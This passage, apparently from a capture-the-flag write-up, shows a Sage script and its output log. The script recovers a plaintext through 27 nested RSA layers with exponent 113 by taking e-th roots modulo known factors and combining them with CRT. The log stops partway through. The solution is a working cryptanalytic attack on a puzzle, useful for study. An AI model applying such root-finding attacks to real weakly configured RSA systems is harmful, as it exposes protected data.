class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">#脚本<span class="number">2</span></span><br><span class="line">#Sage</span><br><span class="line"></span><br><span class="line">n0 = <span class="number">1134876149917575363176366704410565158549594427794901202977560677131703617</span></span><br><span class="line">n1 = <span class="number">68506321231437453734007374706367120760326482177047006099953454136095248103663</span></span><br><span class="line">n2 = <span class="number">7783503593765446343363083302704731608384677185199537317445372251030064778965500447</span></span><br><span class="line">n3 = <span class="number">1070135687488356161164202697449500843725645617129661751744246979913699130211505096520493</span></span><br><span class="line">n4 = <span class="number">84012402115704505952834528733063574032699054524475028392540927197962976150657887637275643641</span></span><br><span class="line">n5 = <span class="number">4497278582433699034700211877087309784829036823057043402314297478185216205338241432310114079123771</span></span><br><span class="line">n6 = <span class="number">222438508972972285373674471797570608108219830357859030918870564627162064662598790037437036093579139489</span></span><br><span class="line">n7 = <span class="number">19116847751264029874551971240684579996570601026679560309305369168779130317938356692609176166515369250878437</span></span><br><span class="line">n8 = <span class="number">1549903986709797721131070830901667744892392382636347158789834851868638863292232718716074359148785900673192362699</span></span><br><span class="line">n9 = <span class="number">62387766690725996279968636478698222263235233511074646032501495855928095611796694112573478405813305623307157261619643</span></span><br><span class="line">n10 = <span class="number">1496134688150941811618178638810353297864345150241986530472328508974364124440160181353848429438725939837967063441528305921</span></span><br><span class="line">n11 = <span class="number">128744123633657656499069966444992201456797762973822340505291131642660343436783413140023509983315177426811890315424928661125061</span></span><br><span class="line">n12 = <span class="number">6917342652058596217869122177298094984415751234677039849514181349685079073411591975537016273056773954075238307918266361998553646469</span></span><br><span class="line">n13 = <span class="number">1999306851167477770905800721615579416365273707414308684419794311809177595829473632853128686208533753019224536487399393397120864878000113</span></span><br><span class="line">n14 = <span class="number">138594056023048386926766329537127538558164718841925506735112367176642328352257472034381662493666299220910783237918231719166519833124529218331</span></span><br><span class="line">n15 = <span class="number">8397272388904583425531462714999219642572091279898695377838194583995214737828538895164195817973441184775814069396690436662985593377966417476040659</span></span><br><span class="line">n16 = <span class="number">83372889332166088651413254885376085265561130214754686361784964744744711092668473281132249352040520639092871294276293287744276919265091479681667169671</span></span><br><span class="line">n17 = <span class="number">10684953914628370830889219903654707140968094024767031366624595731918523435466123514094659595357231410471738736952266383928737163485550013190959149252435167</span></span><br><span class="line">n18 = <span class="number">428359134899960532964729749713513106760306719712194950954567619156985067322564731294653991204666853689688900339268764469280769569535109069729404621290809120793</span></span><br><span class="line">n19 = <span class="number">24491413133428851306933688733518898516890217803647806829002775935975741568422047344206442746983871735723486865901743352102305801200224958166496937663406627341150101</span></span><br><span class="line">n20 = <span class="number">2247517335600310176909964109060502815240207684510918447209767597511414934626668616704865548059751008841620288545344598917362752622130186820039265603312354963258673860579</span></span><br><span class="line">n21 = <span class="number">157978379942536176944325875241196121764116712487226808271002140500926678942090491383544034591205964958130852055691446362753906164711087278555153881606839791499207025307202087</span></span><br><span class="line">n22 = <span class="number">43938571869497484913682975192955012614794498816057204091016374302341854100775132924321569876797699342959191646206571444845883942305710956894334106963321644724361549027630634869933</span></span><br><span class="line">n23 = <span class="number">2609065298534470914730686454716224905333131812890643378630636043224255484662185236061585264231004975072801053316107165770342161619265243081616632312934742288262985830181883449780965531</span></span><br><span class="line">n24 = <span class="number">222235907202454132555071455958700740228567465616560859711214102245461514428187391909176054661864893645713338391509536653547350134615807194339839952004333949540567943568810413945779642106201</span></span><br><span class="line">n25 = <span class="number">44890472824427626252451120059527486677662371033945481542195354255473403815853320591468917295474578271680865394304946847791535710766947049195816261224382109115684638995528332538466194474846836399</span></span><br><span class="line">n26 = <span class="number">1062789633774349417938788353001516763303743389381120380522262327123099728631034935663418832664265833959487018276693680850987382421521055508477988016246558095545925414048663082368488342633334571240563</span></span><br><span class="line">e = <span class="number">113</span></span><br><span class="line">c = <span class="number">1028324919038104683475485759234995158466543298184637219012354053883391759172761125802189697762778242175407876548832454351014064525118465877297277847501477586955680645311999174005606833294172830817159</span></span><br><span class="line"></span><br><span class="line">p26 = <span class="number">978009050697262759337388871320370165458800566798280419667959552859180906066907114053826258140106617</span></span><br><span class="line">q26 = <span class="number">1086686910531802445146659484012613083647370307628438760118376029969836222533970554565751069314622539</span></span><br><span class="line">p25 = <span class="number">5952590790902091635268726673538951527433355660839816621733964706901441977862333411532558667717227</span></span><br><span class="line">q25 = <span class="number">7541333580839789645678699855290145212677767915429008863004397257213367753100058966625356835737037</span></span><br><span class="line">p24 = <span class="number">14702310219802004876082313481498680940324963613770096574742182597840558294030859405666549879531</span></span><br><span class="line">q24 = <span class="number">15115713372931874518523751684548940147062395364112500028355694776530968944848166318295947674571</span></span><br><span class="line">p23 = <span class="number">43870497594014737833600078975099212558645315030912084285417550950854483979406797450479252891</span></span><br><span class="line">q23 = <span class="number">59471978701477648587546053450213894562580907285714122639903144859545186463681183925646967041</span></span><br><span class="line">p22 = <span class="number">206721456778089912780641186795393376537372828449722520397829606593267585681448641482345737</span></span><br><span class="line">q22 = <span class="number">212549643149353357950643557614966235999942509894271006476145929120541407503538644651435909</span></span><br><span class="line">p21 = <span class="number">368461902207817023013078031477042541053987571003677386333567043030477451518424731838173</span></span><br><span class="line">q21 = <span class="number">428750921047556327595864876619292414694543668237320723518704707914310601565770504401619</span></span><br><span class="line">p20 = <span class="number">1328165608715012145707239303399129070657427496129541416861187541092152796676371237057</span></span><br><span class="line">q20 = <span class="number">1692196606246085729483398884059069884182535824953762329164855466589577530953493347747</span></span><br><span class="line">p19 = <span class="number">4479430800690915874719403516331677127806963529247809966024777708496270901092401687</span></span><br><span class="line">q19 = <span class="number">5467527956822382309398095704409409074818664888285375307055715842283183939297839923</span></span><br><span class="line">p18 = <span class="number">15874438801602936764330936047390981280096007684699625987478211613419079727910193</span></span><br><span class="line">q18 = <span class="number">26984206512970181742033712455904984758134288864531714209886622060356697128804201</span></span><br><span class="line">p17 = <span class="number">102366458668689911004027849640392002821642295855327735994412634235696717329671</span></span><br><span class="line">q17 = <span class="number">104379442774418262390337411577160146519860415840398189010112686742489182665577</span></span><br><span class="line">p16 = <span class="number">262775599542220820608778738911414710660835549772895468394761119434220071003</span></span><br><span class="line">q16 = <span class="number">317277895959173163347650321012213555955385929418622006880521870012130207557</span></span><br><span class="line">p15 = <span class="number">2623629589005115152329094552749299711026240699896424120660145647226563547</span></span><br><span class="line">q15 = <span class="number">3200631836176555526009533059891690177091538103904679780020639896015937897</span></span><br><span class="line">p14 = <span class="number">11136261905010083405430254612464029672882837025885682392810368001188527</span></span><br><span class="line">q14 = <span class="number">12445294229358634680867170058509842935273054334385354032543323581223253</span></span><br><span class="line">p13 = <span class="number">43449898447639409732732812916430042263570178747794530133229640125923</span></span><br><span class="line">q13 = <span class="number">46014074200352892806829193743016415423205917845271691428043440245531</span></span><br><span class="line">p12 = <span class="number">66882708962198932251728043152245270662769508317424500666902658099</span></span><br><span class="line">q12 = <span class="number">103424977238409568447978495499643051307907366367259219393937014631</span></span><br><span class="line">p11 = <span class="number">350121371461894793578110243222665782247737840410076591434903787</span></span><br><span class="line">q11 = <span class="number">367712839396521757736384350030802803477965822058616833553305103</span></span><br><span class="line">p10 = <span class="number">954412804126450754097808991490470782833291028309980575506163</span></span><br><span class="line">q10 = <span class="number">1567597041534155679238655992215022394597376421096298363211067</span></span><br><span class="line">p9 = <span class="number">6623023178993627032758350846838617937710601663528839184727</span></span><br><span class="line">q9 = <span class="number">9419832152875820180139633405089278278408407453522978357309</span></span><br><span class="line">p8 = <span class="number">37185691759470013533730603170661686570987787098353146897</span></span><br><span class="line">q8 = <span class="number">41680117092754807988080699273322244961911189757589699867</span></span><br><span class="line">p7 = <span class="number">135813272566456906193934636644217527100917542578856697</span></span><br><span class="line">q7 = <span class="number">140758317578347635848563045232314610161039815135897421</span></span><br><span class="line">p6 = <span class="number">385788223643735590500185001710758495904528462058461</span></span><br><span class="line">q6 = <span class="number">576581905150085393327734090419529952232186498060949</span></span><br><span class="line">p5 = <span class="number">1656848589754467667368312855929759764100120657831</span></span><br><span class="line">q5 = <span class="number">2714357008989072105081411295741540337141142641741</span></span><br><span class="line">p4 = <span class="number">7832299017937880395583715032476962329929226581</span></span><br><span class="line">q4 = <span class="number">10726403821316775206273675267109184566904426261</span></span><br><span class="line">p3 = <span class="number">24335212484189159197840692460327461505035059</span></span><br><span class="line">q3 = <span class="number">43974782968656404951924524450501283426052127</span></span><br><span class="line">p2 = <span class="number">88067722275537586769787599991567203589751</span></span><br><span class="line">q2 = <span class="number">88380889077762105057154017276462714444697</span></span><br><span class="line">p1 = <span class="number">232079231415308325450092906880606082069</span></span><br><span class="line">q1 = <span class="number">295185057334340451492588650872876746227</span></span><br><span class="line">p0 = <span class="number">953730950786751671162019537171974567</span></span><br><span class="line">q0 = <span class="number">1189933229053113361422958527792232151</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve(p, q, c, e, n_):</span><br><span class="line"></span><br><span class="line">    P.&lt;a&gt;= PolynomialRing(Zmod(p), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    f = a ^ e - c</span><br><span class="line">    mps = f.monic().roots()</span><br><span class="line"></span><br><span class="line">    P.&lt;a&gt;= PolynomialRing(Zmod(q), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    g = a ^ e - c</span><br><span class="line">    mqs = g.monic().roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> mpp in mps:</span><br><span class="line">        x = mpp[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> mqq in mqs:</span><br><span class="line">            y = mqq[<span class="number">0</span>]</span><br><span class="line">            solution = CRT_list([<span class="keyword">int</span>(x), <span class="keyword">int</span>(y)], [p, q])</span><br><span class="line">            <span class="keyword">if</span> solution &lt; n_:</span><br><span class="line">                solutions.append(solution)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = []</span><br><span class="line">q = []</span><br><span class="line">n_ = []</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>, <span class="number">27</span>):</span><br><span class="line">    solutions = []</span><br><span class="line">    i = <span class="number">26</span> - i</span><br><span class="line">    print(i)</span><br><span class="line">    print(<span class="string">&quot;c&quot;</span>, c)</span><br><span class="line">    eval(<span class="string">&quot;p.append(p&#123;0&#125;)&quot;</span>.format(i))</span><br><span class="line">    print(<span class="string">&#x27;p&#x27;</span>,p[<span class="number">-1</span>])</span><br><span class="line">    eval(<span class="string">&quot;q.append(q&#123;0&#125;)&quot;</span>.format(i))</span><br><span class="line">    print(<span class="string">&#x27;q&#x27;</span>, q[<span class="number">-1</span>])</span><br><span class="line">    eval(<span class="string">&quot;n_.append(n&#123;0&#125;)&quot;</span>.format(i<span class="number">-1</span>))</span><br><span class="line">    print(<span class="string">&quot;上一个n&quot;</span>, n_[<span class="number">-1</span>])</span><br><span class="line">    solve(p[<span class="number">-1</span>], q[<span class="number">-1</span>], c, e, n_[<span class="number">-1</span>])</span><br><span class="line">    print(solutions)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">21</span>:</span><br><span class="line">        c = solutions[<span class="number">0</span>]</span><br><span class="line">    elif i==<span class="number">9</span>:</span><br><span class="line">        c = solutions[<span class="number">-2</span>]</span><br><span class="line">    elif i==<span class="number">5</span>:</span><br><span class="line">        c = solutions[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c = solutions[<span class="number">-1</span>]</span><br><span class="line">    print()</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"># 输出数据</span><br><span class="line">26</span><br><span class="line">c 1028324919038104683475485759234995158466543298184637219012354053883391759172761125802189697762778242175407876548832454351014064525118465877297277847501477586955680645311999174005606833294172830817159</span><br><span class="line"><span class="selector-tag">p</span> 978009050697262759337388871320370165458800566798280419667959552859180906066907114053826258140106617</span><br><span class="line"><span class="selector-tag">q</span> 1086686910531802445146659484012613083647370307628438760118376029969836222533970554565751069314622539</span><br><span class="line">上一个n 44890472824427626252451120059527486677662371033945481542195354255473403815853320591468917295474578271680865394304946847791535710766947049195816261224382109115684638995528332538466194474846836399</span><br><span class="line"><span class="selector-attr">[34477005676820162206313524350718388995388964361111914461122792945404747258640626572519670215765749828347378102656628531443002193905830917576501911098980764185815997345702819264240009751148442426]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">25</span><br><span class="line">c 34477005676820162206313524350718388995388964361111914461122792945404747258640626572519670215765749828347378102656628531443002193905830917576501911098980764185815997345702819264240009751148442426</span><br><span class="line"><span class="selector-tag">p</span> 5952590790902091635268726673538951527433355660839816621733964706901441977862333411532558667717227</span><br><span class="line"><span class="selector-tag">q</span> 7541333580839789645678699855290145212677767915429008863004397257213367753100058966625356835737037</span><br><span class="line">上一个n 222235907202454132555071455958700740228567465616560859711214102245461514428187391909176054661864893645713338391509536653547350134615807194339839952004333949540567943568810413945779642106201</span><br><span class="line"><span class="selector-attr">[122251474355770407049299923720807002619294038964768766444097932240736660221208587524190952184175408395327264273947998924572358674189845633957638043199338228060748873522292564061697159084155]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">24</span><br><span class="line">c 122251474355770407049299923720807002619294038964768766444097932240736660221208587524190952184175408395327264273947998924572358674189845633957638043199338228060748873522292564061697159084155</span><br><span class="line"><span class="selector-tag">p</span> 14702310219802004876082313481498680940324963613770096574742182597840558294030859405666549879531</span><br><span class="line"><span class="selector-tag">q</span> 15115713372931874518523751684548940147062395364112500028355694776530968944848166318295947674571</span><br><span class="line">上一个n 2609065298534470914730686454716224905333131812890643378630636043224255484662185236061585264231004975072801053316107165770342161619265243081616632312934742288262985830181883449780965531</span><br><span class="line"><span class="selector-attr">[2302982988306130873718678248046965635619977122378875400979845776887964102490919700970705411214473299613671701762260147495040038609477011076066320527267277326015932285789720472919789158]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">23</span><br><span class="line">c 2302982988306130873718678248046965635619977122378875400979845776887964102490919700970705411214473299613671701762260147495040038609477011076066320527267277326015932285789720472919789158</span><br><span class="line"><span class="selector-tag">p</span> 43870497594014737833600078975099212558645315030912084285417550950854483979406797450479252891</span><br><span class="line"><span class="selector-tag">q</span> 59471978701477648587546053450213894562580907285714122639903144859545186463681183925646967041</span><br><span class="line">上一个n 43938571869497484913682975192955012614794498816057204091016374302341854100775132924321569876797699342959191646206571444845883942305710956894334106963321644724361549027630634869933</span><br><span class="line"><span class="selector-attr">[23537451475264654783397519677185909863292665248941544646127041892810699254693157668878272163047447965494360147684605330696871807540713768499564637999043110095219692999410680226995]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">22</span><br><span class="line">c 23537451475264654783397519677185909863292665248941544646127041892810699254693157668878272163047447965494360147684605330696871807540713768499564637999043110095219692999410680226995</span><br><span class="line"><span class="selector-tag">p</span> 206721456778089912780641186795393376537372828449722520397829606593267585681448641482345737</span><br><span class="line"><span class="selector-tag">q</span> 212549643149353357950643557614966235999942509894271006476145929120541407503538644651435909</span><br><span class="line">上一个n 157978379942536176944325875241196121764116712487226808271002140500926678942090491383544034591205964958130852055691446362753906164711087278555153881606839791499207025307202087</span><br><span class="line"><span class="selector-attr">[140177373424899679430074829392928313477693819706173332758040927339401517742208025981523425936186925200196496612125625456430631622632150834127049737384042503028994857458226467]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">21</span><br><span class="line">c 140177373424899679430074829392928313477693819706173332758040927339401517742208025981523425936186925200196496612125625456430631622632150834127049737384042503028994857458226467</span><br><span class="line"><span class="selector-tag">p</span> 368461902207817023013078031477042541053987571003677386333567043030477451518424731838173</span><br><span class="line"><span class="selector-tag">q</span> 428750921047556327595864876619292414694543668237320723518704707914310601565770504401619</span><br><span class="line">上一个n 2247517335600310176909964109060502815240207684510918447209767597511414934626668616704865548059751008841620288545344598917362752622130186820039265603312354963258673860579</span><br><span class="line"><span class="selector-attr">[963130018196161068022561826136699615972631158326273266709450636152057794259408910239684181019014240059847446622341252471979045951190123708301480386597157821916163544334, 219785508612613802216451325231684154232671610129643237209951549593627718088951326786938561835919852060454295291676893330256385004619027744244112309090521216117612270955]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">20</span><br><span class="line">c 963130018196161068022561826136699615972631158326273266709450636152057794259408910239684181019014240059847446622341252471979045951190123708301480386597157821916163544334</span><br><span class="line"><span class="selector-tag">p</span> 1328165608715012145707239303399129070657427496129541416861187541092152796676371237057</span><br><span class="line"><span class="selector-tag">q</span> 1692196606246085729483398884059069884182535824953762329164855466589577530953493347747</span><br><span class="line">上一个n 24491413133428851306933688733518898516890217803647806829002775935975741568422047344206442746983871735723486865901743352102305801200224958166496937663406627341150101</span><br><span class="line"><span class="selector-attr">[22099780396461829722379389411334090279609060431701121609182515723815260652756755053990706324709932514832032225698612585831935469922880299786763383240418382919799321]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">19</span><br><span class="line">c 22099780396461829722379389411334090279609060431701121609182515723815260652756755053990706324709932514832032225698612585831935469922880299786763383240418382919799321</span><br><span class="line"><span class="selector-tag">p</span> 4479430800690915874719403516331677127806963529247809966024777708496270901092401687</span><br><span class="line"><span class="selector-tag">q</span> 5467527956822382309398095704409409074818664888285375307055715842283183939297839923</span><br><span class="line">上一个n 428359134899960532964729749713513106760306719712194950954567619156985067322564731294653991204666853689688900339268764469280769569535109069729404621290809120793</span><br><span class="line"><span class="selector-attr">[339872121965407658932035525463686156827750242931688944610910333924021823802853041665508873405457522819631217022111208112413457553033499000314226547656845920264, 105203615092085867196180713024031580953262645244470745062806287628728083957360817366488801411967688912343820375347382249694217193012009121220949533257603223298]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">18</span><br><span class="line">c 105203615092085867196180713024031580953262645244470745062806287628728083957360817366488801411967688912343820375347382249694217193012009121220949533257603223298</span><br><span class="line"><span class="selector-tag">p</span> 15874438801602936764330936047390981280096007684699625987478211613419079727910193</span><br><span class="line"><span class="selector-tag">q</span> 26984206512970181742033712455904984758134288864531714209886622060356697128804201</span><br><span class="line">上一个n 10684953914628370830889219903654707140968094024767031366624595731918523435466123514094659595357231410471738736952266383928737163485550013190959149252435167</span><br><span class="line"><span class="selector-attr">[2770807474173138559681583722575063626632396109101990628426422882126692567611876893424492013746533498499436328221834686503730687608977519563790607788117242]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">17</span><br><span class="line">c 2770807474173138559681583722575063626632396109101990628426422882126692567611876893424492013746533498499436328221834686503730687608977519563790607788117242</span><br><span class="line"><span class="selector-tag">p</span> 102366458668689911004027849640392002821642295855327735994412634235696717329671</span><br><span class="line"><span class="selector-tag">q</span> 104379442774418262390337411577160146519860415840398189010112686742489182665577</span><br><span class="line">上一个n 83372889332166088651413254885376085265561130214754686361784964744744711092668473281132249352040520639092871294276293287744276919265091479681667169671</span><br><span class="line"><span class="selector-attr">[79522563507420097241671540749267415107213223614814036174487708662964551801437232540659877853816396875693921978483029788328787752167530021794795431857]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">16</span><br><span class="line">c 79522563507420097241671540749267415107213223614814036174487708662964551801437232540659877853816396875693921978483029788328787752167530021794795431857</span><br><span class="line"><span class="selector-tag">p</span> 262775599542220820608778738911414710660835549772895468394761119434220071003</span><br><span class="line"><span class="selector-tag">q</span> 317277895959173163347650321012213555955385929418622006880521870012130207557</span><br><span class="line">上一个n 8397272388904583425531462714999219642572091279898695377838194583995214737828538895164195817973441184775814069396690436662985593377966417476040659</span><br><span class="line"><span class="selector-attr">[5740430010013684628644551879825046012734679272445242381620481408471916167301047890256368008799418782647448496772184916399177933499460690370459556, 2037298899016874045219277999643220063198097234557335235921481885211253636813115803603315238074035822211603707964528777576900935877949510316646223]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">15</span><br><span class="line">c 2037298899016874045219277999643220063198097234557335235921481885211253636813115803603315238074035822211603707964528777576900935877949510316646223</span><br><span class="line"><span class="selector-tag">p</span> 2623629589005115152329094552749299711026240699896424120660145647226563547</span><br><span class="line"><span class="selector-tag">q</span> 3200631836176555526009533059891690177091538103904679780020639896015937897</span><br><span class="line">上一个n 138594056023048386926766329537127538558164718841925506735112367176642328352257472034381662493666299220910783237918231719166519833124529218331</span><br><span class="line"><span class="selector-attr">[91620534205913166538263094639686621545207290194630647497982781366417941090195313655420047805846906050555821244135842146392017800438719304994]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">14</span><br><span class="line">c 91620534205913166538263094639686621545207290194630647497982781366417941090195313655420047805846906050555821244135842146392017800438719304994</span><br><span class="line"><span class="selector-tag">p</span> 11136261905010083405430254612464029672882837025885682392810368001188527</span><br><span class="line"><span class="selector-tag">q</span> 12445294229358634680867170058509842935273054334385354032543323581223253</span><br><span class="line">上一个n 1999306851167477770905800721615579416365273707414308684419794311809177595829473632853128686208533753019224536487399393397120864878000113</span><br><span class="line"><span class="selector-attr">[634223615344447851225076194238185184332604736515528218505996221339671015125769748828654573318605955936504358040759056745442253727290998]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">13</span><br><span class="line">c 634223615344447851225076194238185184332604736515528218505996221339671015125769748828654573318605955936504358040759056745442253727290998</span><br><span class="line"><span class="selector-tag">p</span> 43449898447639409732732812916430042263570178747794530133229640125923</span><br><span class="line"><span class="selector-tag">q</span> 46014074200352892806829193743016415423205917845271691428043440245531</span><br><span class="line">上一个n 6917342652058596217869122177298094984415751234677039849514181349685079073411591975537016273056773954075238307918266361998553646469</span><br><span class="line"><span class="selector-attr">[1151747077760886031968395300122212971249677857649906015143598211944659498637807719069388997270109028927478629593266598515428543599]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">12</span><br><span class="line">c 1151747077760886031968395300122212971249677857649906015143598211944659498637807719069388997270109028927478629593266598515428543599</span><br><span class="line"><span class="selector-tag">p</span> 66882708962198932251728043152245270662769508317424500666902658099</span><br><span class="line"><span class="selector-tag">q</span> 103424977238409568447978495499643051307907366367259219393937014631</span><br><span class="line">上一个n 128744123633657656499069966444992201456797762973822340505291131642660343436783413140023509983315177426811890315424928661125061</span><br><span class="line"><span class="selector-attr">[4885555691619901252961116690244561429850119193038756404218077274265730135140315447675335151534535632576283303735514949638673]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">11</span><br><span class="line">c 4885555691619901252961116690244561429850119193038756404218077274265730135140315447675335151534535632576283303735514949638673</span><br><span class="line"><span class="selector-tag">p</span> 350121371461894793578110243222665782247737840410076591434903787</span><br><span class="line"><span class="selector-tag">q</span> 367712839396521757736384350030802803477965822058616833553305103</span><br><span class="line">上一个n 1496134688150941811618178638810353297864345150241986530472328508974364124440160181353848429438725939837967063441528305921</span><br><span class="line"><span class="selector-attr">[441483827088168645513094641426499891374571558703981036806090540801685962515269086990244001450093104554187188047355883908]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">10</span><br><span class="line">c 441483827088168645513094641426499891374571558703981036806090540801685962515269086990244001450093104554187188047355883908</span><br><span class="line"><span class="selector-tag">p</span> 954412804126450754097808991490470782833291028309980575506163</span><br><span class="line"><span class="selector-tag">q</span> 1567597041534155679238655992215022394597376421096298363211067</span><br><span class="line">上一个n 62387766690725996279968636478698222263235233511074646032501495855928095611796694112573478405813305623307157261619643</span><br><span class="line"><span class="selector-attr">[50746207344403804443969898876160025928774123141871973214027095925794652197169084777221214441362057146919986427284274]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">9</span><br><span class="line">c 50746207344403804443969898876160025928774123141871973214027095925794652197169084777221214441362057146919986427284274</span><br><span class="line"><span class="selector-tag">p</span> 6623023178993627032758350846838617937710601663528839184727</span><br><span class="line"><span class="selector-tag">q</span> 9419832152875820180139633405089278278408407453522978357309</span><br><span class="line">上一个n 1549903986709797721131070830901667744892392382636347158789834851868638863292232718716074359148785900673192362699</span><br><span class="line"><span class="selector-attr">[657107719500394822892028354527169935943474820140535753753542512969310979794098072396859652456232677935960563842, 851834034713920072016294826766890940103178167607817794715692270318536007164857863881508649769981422663639184163, 